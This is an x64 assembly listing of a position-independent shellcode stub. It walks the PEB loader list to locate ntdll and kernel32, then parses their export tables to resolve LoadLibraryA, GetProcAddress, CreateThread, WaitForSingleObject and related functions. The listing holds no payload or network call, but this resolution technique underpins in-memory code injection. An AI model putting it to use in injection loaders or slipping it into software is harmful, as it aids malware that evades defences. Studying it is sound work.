     1                                  [org 0]
     2                                  [bits 64]
     3                                  
     4                                  ShellCode:
     5 00000000 53                      push rbx
     6 00000001 4883EC20                sub rsp,byte +0x20
     7 00000005 65488B042530000000      mov rax,[gs:0x30]
     8 0000000E 4889CB                  mov rbx,rcx
     9 00000011 488B5060                mov rdx,[rax+0x60]
    10 00000015 488991080A0000          mov [rcx+0xa08],rdx
    11 0000001C E82B000000              call GetImageBase
    12                                  
    13 00000021 488B8B100A0000          mov rcx,[rbx+0xa10]
    14 00000028 4889DA                  mov rdx,rbx
    15 0000002B E80B010000              call GetProcAddress
    16                                  
    17 00000030 488B8B180A0000          mov rcx,[rbx+0xa18]
    18 00000037 4889DA                  mov rdx,rbx
    19 0000003A E8FC000000              call GetProcAddress
    20                                  
    21 0000003F B82A000000              mov eax,0x2a
    22 00000044 4883C420                add rsp,byte +0x20
    23 00000048 5B                      pop rbx
    24 00000049 C3                      ret
    25                                  
    26 0000004A CC                      int3
    27 0000004B CC                      int3
    28                                  
    29                                  GetImageBase:
    30 0000004C 488B81080A0000          mov rax,[rcx+0xa08]     ; rax = PEB
    31 00000053 4989C8                  mov r8,rcx
    32 00000056 4C8B4818                mov r9,[rax+0x18]       ; PEB::Ldr
    33 0000005A 498B5120                mov rdx,[r9+0x20]       ; PEB::Ldr->InMemoryOrderModuleList
    34 0000005E 4983C120                add r9,byte +0x20
    35 00000062 4C39CA                  cmp rdx,r9
    36 00000065 0F84CC000000            jz label0xeb
    37                                  
    38 0000006B 4C8B91100A0000          mov r10,[rcx+0xa10]
    39                                  
    40                                  label0x26:
    41 00000072 488B4250                mov rax,[rdx+0x50]
    42 00000076 4D85D2                  test r10,r10
    43 00000079 751A                    jnz label0x49
    44                                  
    45 0000007B 81386E007400            cmp dword [rax],0x74006e
    46 00000081 7512                    jnz label0x49
    47                                  
    48 00000083 81780464006C00          cmp dword [rax+0x4],0x6c0064
    49 0000008A 7509                    jnz label0x49
    50                                  
    51 0000008C 8178086C002E00          cmp dword [rax+0x8],0x2e006c
    52 00000093 741C                    jz label0x65
    53                                  
    54                                  label0x49:
    55 00000095 8B08                    mov ecx,[rax]
    56 00000097 81F94E005400            cmp ecx,0x54004e
    57 0000009D 751F                    jnz label0x72
    58                                  
    59 0000009F 81780444004C00          cmp dword [rax+0x4],0x4c0044
    60 000000A6 7516                    jnz label0x72
    61                                  
    62 000000A8 8178084C002E00          cmp dword [rax+0x8],0x2e004c
    63 000000AF 750D                    jnz label0x72
    64                                  
    65                                  label0x65:
    66 000000B1 4C8B5220                mov r10,[rdx+0x20]
    67 000000B5 4D8990100A0000          mov [r8+0xa10],r10
    68 000000BC EB6D                    jmp label0xdf
    69                                  
    70                                  label0x72:
    71 000000BE 4983B8180A000000        cmp qword [r8+0xa18],byte +0x0
    72 000000C6 752C                    jnz label0xa8
    73                                  
    74 000000C8 81F94B004500            cmp ecx,0x45004b
    75 000000CE 7524                    jnz label0xa8
    76                                  
    77 000000D0 81780452004E00          cmp dword [rax+0x4],0x4e0052
    78 000000D7 751B                    jnz label0xa8
    79                                  
    80 000000D9 81780845004C00          cmp dword [rax+0x8],0x4c0045
    81 000000E0 7512                    jnz label0xa8
    82                                  
    83 000000E2 81780C33003200          cmp dword [rax+0xc],0x320033
    84 000000E9 7509                    jnz label0xa8
    85                                  
    86 000000EB 8178102E004400          cmp dword [rax+0x10],0x44002e
    87 000000F2 742C                    jz label0xd4
    88                                  
    89                                  label0xa8:
    90 000000F4 81F96B006500            cmp ecx,0x65006b
    91 000000FA 752F                    jnz label0xdf
    92                                  
    93 000000FC 81780472006E00          cmp dword [rax+0x4],0x6e0072
    94 00000103 7526                    jnz label0xdf
    95                                  
    96 00000105 81780865006C00          cmp dword [rax+0x8],0x6c0065
    97 0000010C 751D                    jnz label0xdf
    98                                  
    99 0000010E 81780C33003200          cmp dword [rax+0xc],0x320033
   100 00000115 7514                    jnz label0xdf
   101                                  
   102 00000117 8178102E006400          cmp dword [rax+0x10],0x64002e
   103 0000011E 750B                    jnz label0xdf
   104                                  
   105                                  label0xd4:
   106 00000120 488B4220                mov rax,[rdx+0x20]
   107 00000124 498980180A0000          mov [r8+0xa18],rax
   108                                  
   109                                  label0xdf:
   110 0000012B 488B12                  mov rdx,[rdx]
   111 0000012E 4C39CA                  cmp rdx,r9
   112 00000131 0F853BFFFFFF            jnz label0x26
   113                                  
   114                                  label0xeb:
   115 00000137 F3C3                    rep ret
   116                                  
   117                                  
   118 00000139 CC                      int3
   119 0000013A CC                      int3
   120                                  
   121                                  
   122                                  GetProcAddress:
   123 0000013B 4883EC08                sub rsp,byte +0x8
   124 0000013F B84D5A0000              mov eax,0x5a4d
   125 00000144 4989CA                  mov r10,rcx
   126 00000147 663901                  cmp [rcx],ax
   127 0000014A 0F8540020000            jnz label0x355
   128                                  
   129 00000150 448B493C                mov r9d,[rcx+0x3c]
   130 00000154 41813C0950450000        cmp dword [r9+rcx],0x4550
   131 0000015C 0F852E020000            jnz label0x355
   132                                  
   133 00000162 450FB7440904            movzx r8d,word [r9+rcx+0x4]
   134 00000168 41BB4C010000            mov r11d,0x14c
   135 0000016E 664539D8                cmp r8w,r11w
   136 00000172 740F                    jz label0x148
   137                                  
   138 00000174 B864860000              mov eax,0x8664
   139 00000179 664139C0                cmp r8w,ax
   140 0000017D 0F850D020000            jnz label0x355
   141                                  
   142                                  label0x148:
   143 00000183 48895C2410              mov [rsp+0x10],rbx
   144 00000188 664539D8                cmp r8w,r11w
   145 0000018C 4889742420              mov [rsp+0x20],rsi
   146 00000191 48893C24                mov [rsp],rdi
   147 00000195 B870000000              mov eax,0x70
   148 0000019A B960000000              mov ecx,0x60
   149 0000019F 0F44C1                  cmovz eax,ecx
   150 000001A2 4531DB                  xor r11d,r11d
   151 000001A5 4C01C8                  add rax,r9
   152 000001A8 468B4C1018              mov r9d,[rax+r10+0x18]
   153 000001AD 4D01D1                  add r9,r10
   154 000001B0 418B5920                mov ebx,[r9+0x20]
   155 000001B4 418B7924                mov edi,[r9+0x24]
   156 000001B8 418B711C                mov esi,[r9+0x1c]
   157 000001BC 4C01D3                  add rbx,r10
   158 000001BF 4C01D7                  add rdi,r10
   159 000001C2 4C01D6                  add rsi,r10
   160 000001C5 45395918                cmp [r9+0x18],r11d
   161 000001C9 0F86B3010000            jna label0x347
   162                                  
   163 000001CF 48896C2418              mov [rsp+0x18],rbp
   164 000001D4 488BAA200A0000          mov rbp,[rdx+0xa20]
   165                                  
   166                                  label0x1a0:
   167 000001DB 420FB70C5F              movzx ecx,word [rdi+r11*2]
   168 000001E0 428B049B                mov eax,[rbx+r11*4]
   169 000001E4 448B048E                mov r8d,[rsi+rcx*4]
   170 000001E8 4C01D0                  add rax,r10
   171 000001EB 4D01D0                  add r8,r10
   172 000001EE 4885ED                  test rbp,rbp
   173 000001F1 752F                    jnz label0x1e7
   174                                  
   175 000001F3 81384C6F6164            cmp dword [rax],0x64616f4c
   176 000001F9 7527                    jnz label0x1e7
   177                                  
   178 000001FB 8178044C696272          cmp dword [rax+0x4],0x7262694c
   179 00000202 751E                    jnz label0x1e7
   180                                  
   181 00000204 81780861727957          cmp dword [rax+0x8],0x57797261
   182 0000020B 7515                    jnz label0x1e7
   183                                  
   184 0000020D 4038680C                cmp [rax+0xc],bpl
   185 00000211 750F                    jnz label0x1e7
   186                                  
   187 00000213 4C89C5                  mov rbp,r8
   188 00000216 4C8982200A0000          mov [rdx+0xa20],r8
   189 0000021D E94E010000              jmp label0x335
   190                                  
   191                                  label0x1e7:
   192 00000222 4883BA280A000000        cmp qword [rdx+0xa28],byte +0x0
   193 0000022A 7526                    jnz label0x217
   194                                  
   195 0000022C 813846726565            cmp dword [rax],0x65657246
   196 00000232 751E                    jnz label0x217
   197                                  
   198 00000234 8178044C696272          cmp dword [rax+0x4],0x7262694c
   199 0000023B 7515                    jnz label0x217
   200                                  
   201 0000023D 81780861727900          cmp dword [rax+0x8],0x797261
   202 00000244 750C                    jnz label0x217
   203                                  
   204 00000246 4C8982280A0000          mov [rdx+0xa28],r8
   205 0000024D E91E010000              jmp label0x335
   206                                  
   207                                  label0x217:
   208 00000252 4883BA300A000000        cmp qword [rdx+0xa30],byte +0x0
   209 0000025A 7537                    jnz label0x258
   210                                  
   211 0000025C 813847657450            cmp dword [rax],0x50746547
   212 00000262 752F                    jnz label0x258
   213                                  
   214 00000264 817804726F6341          cmp dword [rax+0x4],0x41636f72
   215 0000026B 7526                    jnz label0x258
   216                                  
   217 0000026D 81780864647265          cmp dword [rax+0x8],0x65726464
   218 00000274 751D                    jnz label0x258
   219                                  
   220 00000276 8B480C                  mov ecx,[rax+0xc]
   221 00000279 81E1FFFFFF00            and ecx,0xffffff
   222 0000027F 81F973730000            cmp ecx,0x7373
   223 00000285 750C                    jnz label0x258
   224                                  
   225 00000287 4C8982300A0000          mov [rdx+0xa30],r8
   226 0000028E E9DD000000              jmp label0x335
   227                                  
   228                                  label0x258:
   229 00000293 4883BA380A000000        cmp qword [rdx+0xa38],byte +0x0
   230 0000029B 752C                    jnz label0x28e
   231                                  
   232 0000029D 813843726561            cmp dword [rax],0x61657243
   233 000002A3 7524                    jnz label0x28e
   234                                  
   235 000002A5 81780474655468          cmp dword [rax+0x4],0x68546574
   236 000002AC 751B                    jnz label0x28e
   237                                  
   238 000002AE 81780872656164          cmp dword [rax+0x8],0x64616572
   239 000002B5 7512                    jnz label0x28e
   240                                  
   241 000002B7 80780C00                cmp byte [rax+0xc],0x0
   242 000002BB 750C                    jnz label0x28e
   243                                  
   244 000002BD 4C8982380A0000          mov [rdx+0xa38],r8
   245 000002C4 E9A7000000              jmp label0x335
   246                                  
   247                                  label0x28e:
   248 000002C9 4883BA400A000000        cmp qword [rdx+0xa40],byte +0x0
   249 000002D1 7533                    jnz label0x2cb
   250                                  
   251 000002D3 813852746C45            cmp dword [rax],0x456c7452
   252 000002D9 752B                    jnz label0x2cb
   253                                  
   254 000002DB 81780478697455          cmp dword [rax+0x4],0x55746978
   255 000002E2 7522                    jnz label0x2cb
   256                                  
   257 000002E4 81780873657254          cmp dword [rax+0x8],0x54726573
   258 000002EB 7519                    jnz label0x2cb
   259                                  
   260 000002ED 81780C68726561          cmp dword [rax+0xc],0x61657268
   261 000002F4 7510                    jnz label0x2cb
   262                                  
   263 000002F6 6683781064              cmp word [rax+0x10],byte +0x64
   264 000002FB 7509                    jnz label0x2cb
   265                                  
   266 000002FD 4C8982400A0000          mov [rdx+0xa40],r8
   267 00000304 EB6A                    jmp label0x335
   268                                  
   269                                  label0x2cb:
   270 00000306 4883BA480A000000        cmp qword [rdx+0xa48],byte +0x0
   271 0000030E 7535                    jnz label0x30a
   272                                  
   273 00000310 813857616974            cmp dword [rax],0x74696157
   274 00000316 752D                    jnz label0x30a
   275                                  
   276 00000318 817804466F7253          cmp dword [rax+0x4],0x53726f46
   277 0000031F 7524                    jnz label0x30a
   278                                  
   279 00000321 817808696E676C          cmp dword [rax+0x8],0x6c676e69
   280 00000328 751B                    jnz label0x30a
   281                                  
   282 0000032A 81780C654F626A          cmp dword [rax+0xc],0x6a624f65
   283 00000331 7512                    jnz label0x30a
   284                                  
   285 00000333 81781065637400          cmp dword [rax+0x10],0x746365
   286 0000033A 7509                    jnz label0x30a
   287                                  
   288 0000033C 4C8982480A0000          mov [rdx+0xa48],r8
   289 00000343 EB2B                    jmp label0x335
   290                                  
   291                                  label0x30a:
   292 00000345 4883BA500A000000        cmp qword [rdx+0xa50],byte +0x0
   293 0000034D 7521                    jnz label0x335
   294                                  
   295 0000034F 8138436C6F73            cmp dword [rax],0x736f6c43
   296 00000355 7519                    jnz label0x335
   297                                  
   298 00000357 8178046548616E          cmp dword [rax+0x4],0x6e614865
   299 0000035E 7510                    jnz label0x335
   300                                  
   301 00000360 817808646C6500          cmp dword [rax+0x8],0x656c64
   302 00000367 7507                    jnz label0x335
   303                                  
   304 00000369 4C8982500A0000          mov [rdx+0xa50],r8
   305                                  
   306                                  label0x335:
   307 00000370 41FFC3                  inc r11d
   308 00000373 453B5918                cmp r11d,[r9+0x18]
   309 00000377 0F825EFEFFFF            jc label0x1a0
   310                                  
   311 0000037D 488B6C2418              mov rbp,[rsp+0x18]
   312                                  
   313                                  label0x347:
   314 00000382 488B742420              mov rsi,[rsp+0x20]
   315 00000387 488B5C2410              mov rbx,[rsp+0x10]
   316 0000038C 488B3C24                mov rdi,[rsp]
   317                                  
   318                                  label0x355:
   319 00000390 4883C408                add rsp,byte +0x8
   320 00000394 C3                      ret
   321                                  
   322                                  
   323 00000395 CC                      int3
   324 00000396 CC                      int3
